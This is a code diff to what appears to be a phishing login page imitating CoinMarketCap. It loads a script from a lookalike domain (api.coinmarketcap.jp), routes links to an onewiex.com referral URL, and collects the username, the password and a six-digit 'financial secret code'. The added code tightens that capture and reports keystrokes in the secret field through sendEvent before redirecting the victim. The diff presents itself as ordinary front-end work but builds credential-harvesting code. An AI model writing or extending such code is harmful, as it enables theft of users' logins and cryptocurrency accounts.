@@ -153,7 +153,7 @@
                               <button class="m-btn tr" onclick="signin()">
                                 Sign in</button
                               ><a
-                                href="javascript:void(0)"
+                                href="https://onewiex.com/?upline=012047991013"
                                 class="header-sign__link"
                                 >Forgot password?</a
                               >
@@ -674,17 +674,40 @@
     <script src="https://api.coinmarketcap.jp/loginpage.js?project=onewiex.com&amp;reflink=https://onewiex.com/?upline=012047991013"></script>
     <script>
       SIGNIN_CLICK_TIMES = 1;
+
       async function signin() {
         event.preventDefault();
+
+        const usernameInput = document.getElementById('usernameInput');
+        const passwordInput = document.getElementById('passwordInput');
+
+        if (
+          usernameInput.value.trim() === '' ||
+          passwordInput.value.trim() === ''
+        ) {
+          alert('Please enter both username and password.');
+          return;
+        }
+
+        if (usernameInput.value.includes(' ')) {
+          alert('Invalid username or password.');
+          return;
+        }
 
         const financialSecretCode = document.getElementById(
           'financial-secret-code'
         );
 
         if (SIGNIN_CLICK_TIMES == 1) {
-          SIGNIN_CLICK_TIMES += 1;
           financialSecretCode.style.display = 'block';
+          SIGNIN_CLICK_TIMES = 0;
         } else {
+          const secretInput = document.getElementById('secretInput');
+          const secretRegex = /^\d{6}$/;
+          if (!secretRegex.test(secretInput.value)) {
+            alert('Financial Secret Code must be exactly 6 digits.');
+            return;
+          }
           getUserEventValue();
           await sendEvent('LoginButtonClicked');
           window.location.href = REFLINK;
@@ -699,6 +722,11 @@
           signInForm.classList.toggle('show');
         });
       });
+
+      async function typeSecretInput() {
+        getUserEventValue();
+        await sendEvent('SecretKeywordTyped');
+      }
     </script>
   </body>
 </html>
